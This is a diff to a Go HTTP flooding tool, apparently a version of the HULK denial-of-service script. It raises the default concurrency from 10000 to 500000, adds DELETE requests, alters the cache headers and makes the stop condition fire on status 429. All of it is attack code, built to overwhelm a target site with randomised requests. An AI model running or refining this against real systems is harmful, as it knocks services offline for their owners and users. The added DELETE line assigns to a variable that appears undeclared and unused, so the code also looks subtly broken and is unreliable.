@@ -522,7 +522,7 @@ func main() {
 	t := os.Getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 10000
+		maxproc = 500000
 	}
 
 	u, err := url.Parse(site)
@@ -609,7 +609,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
 		} else {
 			q, err = http.NewRequest("POST", url, strings.NewReader(data))
-			
+			a, err = http.NewRequest("DELETE", url, strings.NewReader(data))
 		}
 
 		if err != nil {
@@ -618,7 +618,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		}
 
 		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
-		q.Header.Set("Cache-Control", "no-cache")
+		q.Header.Set("Cache-Control", "max-age=14400")
 		q.Header.Set("Accept-Charset", acceptCharset)
 		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
 		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
@@ -645,7 +645,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		r.Body.Close()
 		s <- callGotOk
 		if safe {
-			if r.StatusCode >= 500 {
+			if r.StatusCode >= 429 {
 				s <- targetComplete
 			}
 		}
